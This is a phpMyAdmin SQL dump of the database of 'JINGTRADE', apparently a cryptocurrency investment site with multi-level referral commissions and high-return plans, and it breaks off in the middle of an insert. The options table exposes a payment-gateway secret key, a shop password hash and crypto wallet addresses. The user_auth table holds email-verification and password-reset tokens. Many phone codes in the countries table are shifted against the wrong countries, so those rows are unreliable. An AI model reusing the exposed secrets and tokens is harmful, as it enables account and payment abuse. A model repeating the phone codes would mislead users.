-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Nov 29, 2024 at 06:14 AM
-- Server version: 10.6.20-MariaDB-cll-lve
-- PHP Version: 8.3.13

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `jtinrimr_jingtrades.net`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `role` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `uid`, `role`) VALUES
(2, 29791156, 1);

-- --------------------------------------------------------

--
-- Table structure for table `cell`
--

CREATE TABLE `cell` (
  `id` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `leader` int(11) NOT NULL,
  `members` int(11) NOT NULL,
  `worth` int(11) NOT NULL,
  `status` int(1) NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `cell`
--

INSERT INTO `cell` (`id`, `cid`, `leader`, `members`, `worth`, `status`, `date`) VALUES
(1, 11111111, 18709309, 6, 9000, 1, '2020-10-14 13:21:43'),
(4, 42016601, 37177191, 6, 0, 1, '0000-00-00 00:00:00'),
(5, 26421440, 13547091, 6, 0, 1, '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `countries`
--

CREATE TABLE `countries` (
  `id` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `currency` varchar(4) NOT NULL,
  `currency_desc` varchar(35) NOT NULL,
  `phone_code` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `countries`
--

INSERT INTO `countries` (`id`, `name`, `currency`, `currency_desc`, `phone_code`) VALUES
(1, 'Afghanistan', 'AFN\r', 'Afghan afghani', '+93'),
(2, 'Akrotiri and Dhekelia (UK)', 'EUR\r', 'European euro', '+358'),
(3, 'Aland Islands (Finland)', 'EUR\r', 'European euro', '+355\r'),
(4, 'Albania', 'ALL\r', 'Albanian lek', '+213\r'),
(5, 'Algeria', 'DZD\r', 'Algerian dinar', '+1684\r'),
(6, 'American Samoa (USA)', 'USD\r', 'United States dollar', '+376\r'),
(7, 'Andorra', 'EUR\r', 'European euro', '+244\r'),
(8, 'Angola', 'AOA\r', 'Angolan kwanza', '+1264\r'),
(9, 'Anguilla (UK)', 'XCD\r', 'East Caribbean dollar', '+1268\r'),
(10, 'Antigua and Barbuda', 'XCD\r', 'East Caribbean dollar', '+54\r'),
(11, 'Argentina', 'ARS\r', 'Argentine peso', '+374\r'),
(12, 'Armenia', 'AMD\r', 'Armenian dram', '+297\r'),
(13, 'Aruba (Netherlands)', 'AWG\r', 'Aruban florin', '+247\r'),
(14, 'Ascension Island (UK)', 'SHP\r', 'Saint Helena pound', '+61\r'),
(15, 'Australia', 'AUD\r', 'Australian dollar', '+672\r'),
(16, 'Austria', 'EUR\r', 'European euro', '+43\r'),
(17, 'Azerbaijan', 'AZN\r', 'Azerbaijan manat', '+994\r'),
(18, 'Bahamas', 'BSD\r', 'Bahamian dollar', '+1242\r'),
(19, 'Bahrain', 'BHD\r', 'Bahraini dinar', '+973\r'),
(20, 'Bangladesh', 'BDT\r', 'Bangladeshi taka', '+880\r'),
(21, 'Barbados', 'BBD\r', 'Barbadian dollar', '+1246\r'),
(22, 'Belarus', 'BYN\r', 'Belarusian ruble', '+375\r'),
(23, 'Belgium', 'EUR\r', 'European euro', '+32\r'),
(24, 'Belize', 'BZD\r', 'Belize dollar', '+501\r'),
(25, 'Benin', 'XOF\r', 'West African CFA franc', '+229\r'),
(26, 'Bermuda (UK)', 'BMD\r', 'Bermudian dollar', '+1441\r'),
(27, 'Bhutan', 'BTN\r', 'Bhutanese ngultrum', '+975\r'),
(28, 'Bolivia', 'BOB\r', 'Bolivian boliviano', '+591\r'),
(29, 'Bonaire (Netherlands)', 'USD\r', 'United States dollar', '+5997\r'),
(30, 'Bosnia and Herzegovina', 'BAM\r', 'Bosnia and Herzegovina convertible ', '+387\r'),
(31, 'Botswana', 'BWP\r', 'Botswana pula', '+267\r'),
(32, 'Brazil', 'BRL\r', 'Brazilian real', '+55\r'),
(33, 'British Indian Ocean Territory (UK)', 'USD\r', 'United States dollar', '+246\r'),
(34, 'British Virgin Islands (UK)', 'USD\r', 'United States dollar', '+1284\r'),
(35, 'Brunei', 'BND\r', 'Brunei dollar', '+673\r'),
(36, 'Bulgaria', 'BGN\r', 'Bulgarian lev', '+359\r'),
(37, 'Burkina Faso', 'XOF\r', 'West African CFA franc', '+226\r'),
(38, 'Burundi', 'BIF\r', 'Burundi franc', '+257\r'),
(39, 'Cabo Verde', 'CVE\r', 'Cape Verdean escudo', '+855\r'),
(40, 'Cambodia', 'KHR\r', 'Cambodian riel', '+855'),
(41, 'Cameroon', 'XAF\r', 'Central African CFA franc', '+237'),
(42, 'Canada', 'CAD\r', 'Canadian dollar', '+1'),
(43, 'Caribbean Netherlands (Netherlands)', 'USD\r', 'United States dollar', '+599\r'),
(44, 'Cayman Islands (UK)', 'KYD\r', 'Cayman Islands dollar', '+1345\r'),
(45, 'Central African Republic', 'XAF\r', 'Central African CFA franc', '+236\r'),
(46, 'Chad', 'XAF\r', 'Central African CFA franc', '+235\r'),
(47, 'Chatham Islands (New Zealand)', 'NZD\r', 'New Zealand dollar', '+64\r'),
(48, 'Chile', 'CLP\r', 'Chilean peso', '+56\r'),
(49, 'China', 'CNY\r', 'Chinese Yuan Renminbi', '+86\r'),
(50, 'Christmas Island (Australia)', 'AUD\r', 'Australian dollar', '+6189164\r'),
(51, 'Cocos (Keeling) Islands (Australia)', 'AUD\r', 'Australian dollar', '+6189162\r'),
(52, 'Colombia', 'COP\r', 'Colombian peso', '+57\r'),
(53, 'Comoros', 'KMF\r', 'Comorian franc', '+269\r'),
(54, 'Congo', 'XAF\r', 'Central African CFA franc', '+242\r'),
(55, 'Congo, Democratic Republic', 'CDFv', 'Congolese franc', '+243\r'),
(56, 'Cook Islands (New Zealand)', 'USD\r', 'Cook Islands dollar', '+682\r'),
(57, 'Costa Rica', 'CRC\r', 'Costa Rican colon', '+506\r'),
(58, 'Cote d\'Ivoire', 'XOF\r', 'West African CFA franc', '+225\r'),
(59, 'Croatia', 'HRK\r', 'Croatian kuna', '+385\r'),
(60, 'Cuba', 'CUP\r', 'Cuban peso', '+53\r'),
(61, 'Curacao (Netherlands)', 'ANG\r', 'Netherlands Antillean guilder', '+5999\r'),
(62, 'Cyprus', 'EUR\r', 'European euro', '+357\r'),
(63, 'Czech Republic', 'CZK\r', 'Czech koruna', '+420\r'),
(64, 'Denmark', 'DKK\r', 'Danish krone', '+45\r'),
(65, 'Djibouti', 'DJF\r', 'Djiboutian franc', '+253\r'),
(66, 'Dominica', 'XCD\r', 'East Caribbean dollar', '+1767\r'),
(67, 'Dominican Republic', 'DOP\r', 'Dominican peso', '+1849\r'),
(68, 'Ecuador', 'USD\r', 'United States dollar', '+593\r'),
(69, 'Egypt', 'EGP\r', 'Egyptian pound', '+20\r'),
(70, 'El Salvador', 'USD\r', 'United States dollar', '+503\r'),
(71, 'Equatorial Guinea', 'XAF\r', 'Central African CFA franc', '+240\r'),
(72, 'Eritrea', 'ERN\r', 'Eritrean nakfa', '+291\r'),
(73, 'Estonia', 'EUR\r', 'European euro', '+372\r'),
(74, 'Ethiopia', 'ETB\r', 'Ethiopian birr', '+251\r'),
(75, 'Falkland Islands (UK)', 'FKP\r', 'Falkland Islands pound', '+500\r'),
(76, 'Faroe Islands (Denmark)', 'none', 'Faroese krona', '+298\r'),
(77, 'Fiji', 'FJD\r', 'Fijian dollar', '+679\r'),
(78, 'Finland', 'EUR\r', 'European euro', '+358\r'),
(79, 'France', 'EUR\r', 'European euro', '+33\r'),
(80, 'French Guiana (France)', 'EUR\r', 'European euro', '+594\r'),
(81, 'French Polynesia (France)', 'XPF\r', 'CFP franc', '+689\r'),
(82, 'Gabon', 'XAF\r', 'Central African CFA franc', '+241\r'),
(83, 'Gambia', 'GMD\r', 'Gambian dalasi', '+220\r'),
(84, 'Georgia', 'GEL\r', 'Georgian lari', '+995\r'),
(85, 'Germany', 'EUR\r', 'European euro', '+49\r'),
(86, 'Ghana', 'GHS\r', 'Ghanaian cedi', '+233\r'),
(87, 'Gibraltar (UK)', 'GIP\r', 'Gibraltar pound', '+350\r'),
(88, 'Greece', 'EUR\r', 'European euro', '+30\r'),
(89, 'Greenland (Denmark)', 'DKK\r', 'Danish krone', '+299\r'),
(90, 'Grenada	East', 'XCD\r', 'Caribbean dollar', '+1473\r'),
(91, 'Guadeloupe (France)', 'EUR\r', 'European euro', '+590\r'),
(92, 'Guam (USA)', 'USD\r', 'United States dollar', '+1671\r'),
(93, 'Guatemala', 'GTQ\r', 'Guatemalan quetzal', '+502\r'),
(94, 'Guernsey (UK)', 'GGP\r', 'Guernsey Pound', '+44\r'),
(95, 'Guinea', 'GNF\r', 'Guinean franc', '+224\r'),
(96, 'Guinea-Bissau', 'XOF\r', 'West African CFA franc', '+245\r'),
(97, 'Guyana', 'GYD\r', 'Guyanese dollar', '+592\r'),
(98, 'Haiti', 'HTG\r', 'Haitian gourde', '+509\r'),
(99, 'Honduras', 'HNL\r', 'Honduran lempira', '+504\r'),
(100, 'Hong Kong (China)', 'HKD\r', 'Hong Kong dollar', '+852\r'),
(101, 'Hungary', 'HUF\r', 'Hungarian forint', '+36\r'),
(102, 'Iceland', 'ISK\r', 'Icelandic krona', '+354\r'),
(103, 'India', 'INR\r', 'Indian rupee', '+91\r'),
(104, 'Indonesia', 'IDR\r', 'Indonesian rupiah', '+62\r'),
(105, 'Iran', 'IRR\r', 'Iranian rial', '+98\r'),
(106, 'Iraq', 'IQD\r', 'Iraqi dinar', '+964\r'),
(107, 'Ireland', 'EUR\r', 'European euro', '+353\r'),
(108, 'Isle of Man (UK)', 'IMP\r', 'Manx pound', '+44\r'),
(109, 'Israel', 'ILS\r', 'Israeli new shekel', '+972\r'),
(110, 'Italy', 'EUR\r', 'European euro', '+39\r'),
(111, 'Jamaica', 'JMD\r', 'Jamaican dollar', '+1876\r'),
(112, 'Japan', 'JPY\r', 'Japanese yen', '+81\r'),
(113, 'Jersey (UK)', 'JEP\r', 'Jersey pound', '+44\r'),
(114, 'Jordan', 'JOD\r', 'Jordanian dinar', '+962\r'),
(115, 'Kazakhstan', 'KZT\r', 'Kazakhstani tenge', '+7\r'),
(116, 'Kenya', 'KES\r', 'Kenyan shilling', '+254\r'),
(117, 'Kiribati', 'AUD\r', 'Australian dollar', '+686\r'),
(118, 'Kosovo', 'EUR\r', 'European euro', '+381\r'),
(119, 'Kuwait', 'KWD\r', 'Kuwaiti dinar', '+965\r'),
(120, 'Kyrgyzstan', 'KGS\r', 'Kyrgyzstani som', '+996\r'),
(121, 'Laos', 'LAK\r', 'Lao kip', '+856\r'),
(122, 'Latvia', 'EUR\r', 'European euro', '+371\r'),
(123, 'Lebanon', 'LBP\r', 'Lebanese pound', '+961\r'),
(124, 'Lesotho', 'LSL\r', 'Lesotho loti', '+266\r'),
(125, 'Liberia', 'LRD\r', 'Liberian dollar', '+231\r'),
(126, 'Libya', 'LYD\r', 'Libyan dinar', '+218\r'),
(127, 'Liechtenstein', 'CHF\r', 'Swiss franc', '+423\r'),
(128, 'Lithuania', 'EUR\r', 'European euro', '+370\r'),
(129, 'Luxembourg', 'EUR\r', 'European euro', '+352\r'),
(130, 'Macau (China)', 'MOP\r', 'Macanese pataca', '+853\r'),
(131, 'Macedonia (FYROM)', 'MKD\r', 'Macedonian denar', '+389\r'),
(132, 'Madagascar', 'MGA\r', 'Malagasy ariary', '+261\r'),
(133, 'Malawi', 'MWK\r', 'Malawian kwacha', '+265\r'),
(134, 'Malaysia', 'MYR\r', 'Malaysian ringgit', '+60\r'),
(135, 'Maldives', 'MVR\r', 'Maldivian rufiyaa', '+960\r'),
(136, 'Mali', 'XOF\r', 'West African CFA franc', '+223\r'),
(137, 'Malta', 'EUR\r', 'European euro', '+356\r'),
(138, 'Marshall Islands', 'USD\r', 'United States dollar', '+692\r'),
(139, 'Martinique (France)', 'EUR\r', 'European euro', '+596\r'),
(140, 'Mauritania', 'MRU\r', 'Mauritanian ouguiya', '+222\r'),
(141, 'Mauritius', 'MUR\r', 'Mauritian rupee', '+230\r'),
(142, 'Mayotte (France)', 'EUR\r', 'European euro', '+262\r'),
(143, 'Mexico', 'MXN\r', 'Mexican peso', '+52\r'),
(144, 'Micronesia', 'USD\r', 'United States dollar', '+691\r'),
(145, 'Moldova', 'MDL\r', 'Moldovan leu', '+373\r'),
(146, 'Monaco', 'EUR\r', 'European euro', '+377\r'),
(147, 'Mongolia', 'MNT\r', 'Mongolian tugrik', '+976\r'),
(148, 'Montenegro', 'EUR\r', 'European euro', '+382\r'),
(149, 'Montserrat (UK)', 'XCD\r', 'East Caribbean dollar', '+1664\r'),
(150, 'Morocco', 'MAD\r', 'Moroccan dirham', '+212\r'),
(151, 'Mozambique', 'MZN\r', 'Mozambican metical', '+258\r'),
(152, 'Myanmar (Burma)', 'MMK\r', 'Myanmar kyat', '+95\r'),
(153, 'Namibia', 'NAD\r', 'Namibian dollar', '+264\r'),
(154, 'Nauru', 'AUD\r', 'Australian dollar', '+674\r'),
(155, 'Nepal', 'NPR\r', 'Nepalese rupee', '+977\r'),
(156, 'Netherlands', 'EUR\r', 'European euro', '+31\r'),
(157, 'New Caledonia (France)', 'XPF\r', 'CFP franc', '+687\r'),
(158, 'New Zealand', 'NZD\r', 'New Zealand dollar', '+64\r'),
(159, 'Nicaragua', 'NIO\r', 'Nicaraguan cordoba', '+505\r'),
(160, 'Niger', 'XOF\r', 'West African CFA franc', '+227\r'),
(161, 'Nigeria', 'NGN\r', 'Nigerian naira', '+234'),
(162, 'Niue (New Zealand)', 'NZD\r', 'New Zealand dollar', '+683\r'),
(163, 'Norfolk Island (Australia)', 'AUD\r', 'Australian dollar', '+6723\r'),
(164, 'Northern Mariana Islands (USA)', 'USD\r', 'United States dollar', '+1670\r'),
(165, 'North Korea	North', 'KPW\r', 'Korean won', '+850\r'),
(166, 'Norway', 'NOK\r', 'Norwegian krone', '+47\r'),
(167, 'Oman', 'OMR\r', 'Omani rial', '+968\r'),
(168, 'Pakistan', 'PKR\r', 'Pakistani rupee', '+92\r'),
(169, 'Palau', 'USD\r', 'United States dollar', '+680\r'),
(170, 'Palestine', 'ILS\r', 'Israeli new shekel', '+970\r'),
(171, 'Panama', 'USD\r', 'United States dollar', '+507\r'),
(172, 'Papua New Guinea', 'PGK\r', 'Papua New Guinean kina', '+675\r'),
(173, 'Paraguay', 'PYG\r', 'Paraguayan guarani', '+595\r'),
(174, 'Peru', 'PEN\r', 'Peruvian sol', '+51\r'),
(175, 'Philippines', 'PHP\r', 'Philippine peso', '+63\r'),
(176, 'Pitcairn Islands (UK)', 'NZD\r', 'New Zealand dollar', '+64\r'),
(177, 'Poland', 'PLN\r', 'Polish zloty', '+48\r'),
(178, 'Portugal', 'EUR\r', 'European euro', '+351\r'),
(179, 'Puerto Rico (USA)', 'USD\r', 'United States dollar', '+1787\r'),
(180, 'Qatar', 'QAR\r', 'Qatari riyal', '+974\r'),
(181, 'Reunion (France)', 'EUR\r', 'European euro', '+262\r'),
(182, 'Romania', 'RON\r', 'Romanian leu', '+40\r'),
(183, 'Russia', 'RUB\r', 'Russian ruble', '+7\r'),
(184, 'Rwanda', 'RWF\r', 'Rwandan franc', '+250\r'),
(185, 'Saba (Netherlands)', 'USD\r', 'United States dollar', '+5994\r'),
(186, 'Saint Barthelemy (France)', 'EUR\r', 'European euro', '+590\r'),
(187, 'Saint Helena (UK)', 'SHP\r', 'Saint Helena pound', '+290\r'),
(188, 'Saint Kitts and Nevis', 'XCD\r', 'East Caribbean dollar', '+1869\r'),
(189, 'Saint Lucia	East', 'XCD\r', 'Caribbean dollar', '+1758\r'),
(190, 'Saint Martin (France)', 'EUR\r', 'European euro', '+590\r'),
(191, 'Saint Pierre and Miquelon (France)', 'EUR\r', 'European euro', '+508\r'),
(192, 'Saint Vincent and the Grenadines', 'XCD\r', 'East Caribbean dollar', '+1784\r'),
(193, 'Samoa', 'WST\r', 'Samoan tala', '+685\r'),
(194, 'San Marino', 'EUR\r', 'European euro', '+378\r'),
(195, 'Sao Tome and Principe', 'STN\r', 'Sao Tome and Principe dobra', '+239\r'),
(196, 'Saudi Arabia', 'SAR\r', 'Saudi Arabian riyal', '+966\r'),
(197, 'Senegal', 'XOF\r', 'West African CFA franc', '+221\r'),
(198, 'Serbia', 'RSD\r', 'Serbian dinar', '+381\r'),
(199, 'Seychelles', 'SCR\r', 'Seychellois rupee', '+248\r'),
(200, 'Sierra Leone', 'SLL\r', 'Sierra Leonean leone', '+232\r'),
(201, 'Singapore', 'SGD\r', 'Singapore dollar', '+65\r'),
(202, 'Sint Eustatius (Netherlands)', 'USD\r', 'United States dollar', '+5993\r'),
(203, 'Sint Maarten (Netherlands)', 'ANG\r', 'Netherlands Antillean guilder', '+1721\r'),
(204, 'Slovakia', 'EUR\r', 'European euro', '+421\r'),
(205, 'Slovenia', 'EUR\r', 'European euro', '+386\r'),
(206, 'Solomon Islands', 'SBD\r', 'Solomon Islands dollar', '+677\r'),
(207, 'Somalia', 'SOS\r', 'Somali shilling', '+252\r'),
(208, 'South Africa', 'ZAR\r', 'South African rand', '+27\r'),
(209, 'South Georgia Island (UK)', 'GBP\r', 'Pound sterling', '+500\r'),
(210, 'South Korea', 'KRW\r', 'South Korean won', '+82\r'),
(211, 'South Sudan', 'SSP\r', 'South Sudanese pound', '+211\r'),
(212, 'Spain', 'EUR\r', 'European euro', '+34\r'),
(213, 'Sri Lanka', 'LKR\r', 'Sri Lankan rupee', '+94\r'),
(214, 'Sudan', 'SDG\r', 'Sudanese pound', '+249\r'),
(215, 'Suriname', 'SRD\r', 'Surinamese dollar', '+597\r'),
(216, 'Svalbard and Jan Mayen (Norway)', 'NOK\r', 'Norwegian krone', '+4779\r'),
(217, 'Swaziland', 'SZL\r', 'Swazi lilangeni', '+268\r'),
(218, 'Sweden', 'SEK\r', 'Swedish krona', '+46\r'),
(219, 'Switzerland', 'CHF\r', 'Swiss franc', '+41\r'),
(220, 'Syria', 'SYP\r', 'Syrian pound', '+963\r'),
(221, 'Taiwan', 'TWD\r', 'New Taiwan dollar', '+886\r'),
(222, 'Tajikistan', 'TJS\r', 'Tajikistani somoni', '+992\r'),
(223, 'Tanzania', 'TZS\r', 'Tanzanian shilling', '+255\r'),
(224, 'Thailand', 'THB\r', 'Thai baht', '+66\r'),
(225, 'Timor-Leste', 'USD\r', 'United States dollar', '+670\r'),
(226, 'Togo', 'XOF\r', 'West African CFA franc', '+228\r'),
(227, 'Tokelau (New Zealand)', 'NZD\r', 'New Zealand dollar', '+690\r'),
(228, 'Tonga', 'TOP\r', 'Tongan paâ€™anga', '+676\r'),
(229, 'Trinidad and Tobago', 'TTD\r', 'Trinidad and Tobago dollar', '+1868\r'),
(230, 'Tristan da Cunha (UK)', 'GBP\r', 'Pound sterling', '+2908\r'),
(231, 'Tunisia', 'TND\r', 'Tunisian dinar', '+216\r'),
(232, 'Turkey', 'TRY\r', 'Turkish lira', '+90\r'),
(233, 'Turkmenistan', 'TMT\r', 'Turkmen manat', '+993\r'),
(234, 'Turks and Caicos Islands (UK)', 'USD\r', 'United States dollar', '+1649\r'),
(235, 'Tuvalu', 'AUD\r', 'Australian dollar', '+688\r'),
(236, 'Uganda', 'UGX\r', 'Ugandan shilling', '+256\r'),
(237, 'Ukraine', 'UAH\r', 'Ukrainian hryvnia', '+380\r'),
(238, 'United Arab Emirates', 'AED\r', 'UAE dirham', '+971\r'),
(239, 'United Kingdom', 'GBP\r', 'Pound sterling', '+44\r'),
(240, 'United States of America', 'USD\r', 'United States dollar', '+1\r'),
(241, 'Uruguay', 'UYU\r', 'Uruguayan peso', '+598\r'),
(242, 'US Virgin Islands (USA)', 'USD\r', 'United States dollar', '+1340\r'),
(243, 'Uzbekistan', 'UZS\r', 'Uzbekistani som', '+998\r'),
(244, 'Vanuatu', 'VUV\r', 'Vanuatu vatu', '+678\r'),
(245, 'Vatican City (Holy See)', 'EUR\r', 'European euro', '+379\r'),
(246, 'Venezuela', 'VEF\r', 'Venezuelan bolivar', '+58\r'),
(247, 'Vietnam', 'VND\r', 'Vietnamese dong', '+84\r'),
(248, 'Wake Island (USA)', 'USD\r', 'United States dollar', '+808\r'),
(249, 'Wallis and Futuna (France)', 'XPF\r', 'CFP franc', '+681\r'),
(250, 'Yemen', 'YER\r', 'Yemeni rial', '+967\r'),
(251, 'Zambia', 'ZMW\r', 'Zambian kwacha', '+260\r'),
(252, 'Zimbabwe', 'USD', 'United States dollar', '+263');

-- --------------------------------------------------------

--
-- Table structure for table `investment`
--

CREATE TABLE `investment` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `plan` int(11) NOT NULL,
  `type` varchar(10) NOT NULL,
  `amount` double NOT NULL,
  `profit` double NOT NULL,
  `duration` int(5) NOT NULL,
  `status` int(1) NOT NULL,
  `start` datetime NOT NULL,
  `end` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `investment`
--

INSERT INTO `investment` (`id`, `uid`, `plan`, `type`, `amount`, `profit`, `duration`, `status`, `start`, `end`) VALUES
(72, 35254515, 1, 'forex', 999, 0, 7, 0, '2024-07-21 10:06:28', '0000-00-00 00:00:00'),
(73, 45060437, 1, 'forex', 50, 0, 7, 0, '2024-09-29 09:28:54', '0000-00-00 00:00:00'),
(74, 45060437, 1, 'forex', 100, 0, 7, 0, '2024-09-29 09:29:47', '0000-00-00 00:00:00'),
(75, 48648111, 1, 'forex', 100, 0, 7, 0, '2024-09-29 09:58:18', '0000-00-00 00:00:00'),
(76, 99411565, 1, 'forex', 100, 0, 5, 0, '2024-09-30 02:54:50', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `level`
--

CREATE TABLE `level` (
  `id` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `start` double NOT NULL,
  `target` double NOT NULL,
  `reward` double NOT NULL,
  `coordinator` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `level`
--

INSERT INTO `level` (`id`, `name`, `start`, `target`, `reward`, `coordinator`) VALUES
(1, 'Investor', 1, 20000, 2000, 1),
(2, 'Leader', 20001, 100000, 20000, 1),
(3, 'Mentor', 100001, 250000, 50000, 1),
(4, 'Legend', 250001, 1000000, 200000, 1);

-- --------------------------------------------------------

--
-- Table structure for table `options`
--

CREATE TABLE `options` (
  `id` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `value` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `options`
--

INSERT INTO `options` (`id`, `name`, `value`) VALUES
(1, 'site_title', 'JINGTRADE'),
(2, 'site_email', 'support@jingtrades.online'),
(3, 'alfcoin_sk', '556613223b5f8d8939118cd2d1dfef70'),
(4, 'alfcoin_shop_name', 'Cryptocurrency Payment'),
(5, 'alfcoin_shop_password', 'C81E728D9D4C2F636F067F89CC14862C'),
(6, 'cell_members', '12'),
(7, 'cell_leader_comm', '4'),
(8, 'cell_members_comm', '2'),
(9, 'referral1', '5'),
(10, 'referral2', '3'),
(11, 'referral3', '1.5'),
(12, 'reinvest_comm', '5'),
(13, 'roi_threshold', '10'),
(14, 'referral_threshold', '20'),
(15, 'group_threshold', '30'),
(16, 'reinvest_threshold', '50'),
(17, 'coordinator_comm', '2.5'),
(18, 'coordinator_threshold', '100'),
(19, 'site_url', 'jingtrades.online'),
(20, 'btc_address', 'bc1qfqn4v2q4rwysje7gxrsuset6mhzuj0x92je0vv'),
(21, 'usdt_address', 'TTZMjw737fvyoUoSicH1cSWRN3JSjcH4AM'),
(22, 'eth_address', '0x3c25bF87Ea566E1089c4dc71E38403234933D20f'),
(23, 'site_abv', 'JING'),
(24, 'cert_no', '13103856'),
(25, 'cert_link', 'https://beta.companieshouse.gov.uk/company/13103856'),
(26, 'cert_date', ' 30th December 2020'),
(27, 'site_address', '6 Leaside Close, Welwyn Garden City, Welwyn Garden City, United Kingdom, AL8 7DY'),
(28, 'site_tagline', 'Empowering Growth, Enriching Futures'),
(29, 'site_phone', '+40xxxxxxxxx'),
(30, 'bank_name', ''),
(31, 'account_name  ', ''),
(32, 'account_number', ''),
(33, 'account_type ', ''),
(34, 'branch ', ''),
(35, 'beneficiary_reference', ''),
(36, 'reference', 'VRYUD9Y38A');

-- --------------------------------------------------------

--
-- Table structure for table `payment_methods`
--

CREATE TABLE `payment_methods` (
  `id` int(11) NOT NULL,
  `pic_url` varchar(100) NOT NULL,
  `name` varchar(50) NOT NULL,
  `abv` varchar(5) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `payment_methods`
--

INSERT INTO `payment_methods` (`id`, `pic_url`, `name`, `abv`) VALUES
(1, 'assets/img/if_Bitcoin_2745023.png', 'Bitcoin', 'BTC'),
(2, 'assets/img/if_etherium_eth_ethcoin_crypto_2844386.png', 'Etherium', 'ETH'),
(3, 'assets/img/if_dash_dashcoin_2844383.png', 'Dash', 'DASH'),
(4, 'assets/img/if_ripple_xrp_coin_2844396.png', 'Ripple', 'XRP'),
(5, 'assets/img/if_litecion_ltc_lite_coin_crypto_2844390.png', 'Litcoin', 'LTC');

-- --------------------------------------------------------

--
-- Table structure for table `plans`
--

CREATE TABLE `plans` (
  `id` int(11) NOT NULL,
  `fid` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `roi` double NOT NULL,
  `min_amt` double NOT NULL,
  `max_amt` double NOT NULL,
  `type` varchar(10) NOT NULL,
  `short_desc` varchar(100) NOT NULL,
  `description` varchar(255) NOT NULL,
  `duration` int(11) NOT NULL,
  `cashout` double NOT NULL,
  `status` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `plans`
--

INSERT INTO `plans` (`id`, `fid`, `name`, `roi`, `min_amt`, `max_amt`, `type`, `short_desc`, `description`, `duration`, `cashout`, `status`) VALUES
(1, 0, 'Bronze', 3, 100, 999, 'forex', 'Best for beginners in crypto investment', 'Min. $100 - $999 Max.', 5, 15, 1),
(2, 0, 'Silver', 4, 1000, 9999, 'forex', 'Best for intermediates in crypto investment', 'Min. $1,000 - $9,999 Max.', 5, 20, 1),
(3, 0, 'Gold', 6, 10000, 49000, 'forex', 'Best for experts in crypto investment', 'Min. $10,000 - $49,000 Max.', 5, 30, 1),
(4, 0, 'Diamond', 8, 50000, 100000, 'forex', 'Best for veterans in crypto investment', 'Min. $50,000 - $100,000 Max.', 5, 40, 1);

-- --------------------------------------------------------

--
-- Table structure for table `user_auth`
--

CREATE TABLE `user_auth` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `auth` varchar(255) NOT NULL,
  `type` varchar(50) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `user_auth`
--

INSERT INTO `user_auth` (`id`, `uid`, `auth`, `type`, `date`) VALUES
(226, 50025647, '84d5711e9bf5547001b765878e7b0157', 'email_verify', '2024-10-17 04:58:23'),
(225, 44627242, 'b3f61131b6eceeb2b14835fa648a48ff', 'email_verify', '2024-10-12 12:30:20'),
(224, 25283935, '39ea40e164f970c54b0530436d5a9f7a', 'email_verify', '2024-10-10 02:01:34'),
(223, 90506686, '250413d2982f1f83aa62a3a323cd2a87', 'email_verify', '2024-10-08 02:30:50'),
(220, 38531419, 'ec73a08511f0f15158c830720aee7588', 'pass_reset', '2024-10-03 18:56:11'),
(213, 94575126, '83e8ef518174e1eb6be4a0778d050c9d', 'email_verify', '2024-09-28 22:52:40');

-- --------------------------------------------------------

--
-- Table structure for table `user_bonus`
--

CREATE TABLE `user_bonus` (
  `id` double NOT NULL,
  `creditor` int(11) NOT NULL,
  `debitor` int(11) NOT NULL,
  `amount` double NOT NULL,
  `type` varchar(50) NOT NULL,
  `ref` varchar(150) NOT NULL,
  `status` int(1) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `user_bonus`
--

INSERT INTO `user_bonus` (`id`, `creditor`, `debitor`, `amount`, `type`, `ref`, `status`, `date`) VALUES
(1, 29791156, 0, 2.5, 'Referral', 'GD5569337781GD', 1, '2024-09-29 08:28:54'),
(2, 29791156, 0, 1.25, 'Coordinator', 'JB2626404850JB', 1, '2024-09-29 08:28:54'),
(3, 29791156, 0, 5, 'Referral', 'LR8843905592LR', 1, '2024-09-29 08:29:47'),
